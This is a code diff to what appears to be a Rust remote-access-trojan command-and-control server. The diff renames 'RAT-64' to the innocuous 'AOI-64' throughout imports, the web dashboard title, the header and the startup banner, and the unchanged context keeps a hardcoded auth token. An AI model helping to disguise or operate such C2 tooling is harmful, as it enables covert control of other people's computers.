@@ -17,9 +17,9 @@ use tokio::{
 };
 // Safe diagnostics from library (no secrets)
 #[cfg(feature = "server_diagnostics")]
-use rat_64::collectors::network_diagnostics::collect_network_diagnostics;
+use aoi_64::collectors::network_diagnostics::collect_network_diagnostics;
 #[cfg(all(feature = "server_diagnostics", windows))]
-use rat_64::get_system_info;
+use aoi_64::get_system_info;
 
 const AUTH_TOKEN: &str = "ZajmPAB9o8C5UgATU23mnGdBcun30IuILDaP8efMWRYtSlvT89";
 const PORT: u16 = 9999;
@@ -416,7 +416,7 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
 <html lang="ja">
 <head>
   <meta charset="utf-8" />
-  <title>RAT-64 C2 Server</title>
+  <title>AOI-64 C2 Server</title>
   <style>
     body {{ 
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
@@ -1356,14 +1356,14 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
       setInterval(updateStatus, 5000);  // 5秒ごとにステータス更新
       setInterval(updateLogs, 3000);    // 3秒ごとにログ更新
       setInterval(updateClients, 8000); // 8秒ごとにクライアント情報更新
-      addToLog('RAT-64 C2 Server WebUI 初期化完了');
+      addToLog('AOI-64 C2 Server WebUI 初期化完了');
     }});
   </script>
 </head>
 <body>
   <div class="container">
     <div class="header">
-      <h1>🐀 RAT-64 C2 Command Center</h1>
+      <h1>🌸 AOI-64 C2 Command Center</h1>
     </div>
     
     <div class="status-bar">
@@ -2099,7 +2099,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     });
 
     println!("============================================================");
-    println!("🚀 RAT-64 Hyper Test Server");
+    println!("🚀 AOI-64 Hyper Test Server");
     println!("============================================================");
     println!("Server URL: http://localhost:{}", PORT);
     println!("Auth Token: {}", AUTH_TOKEN);
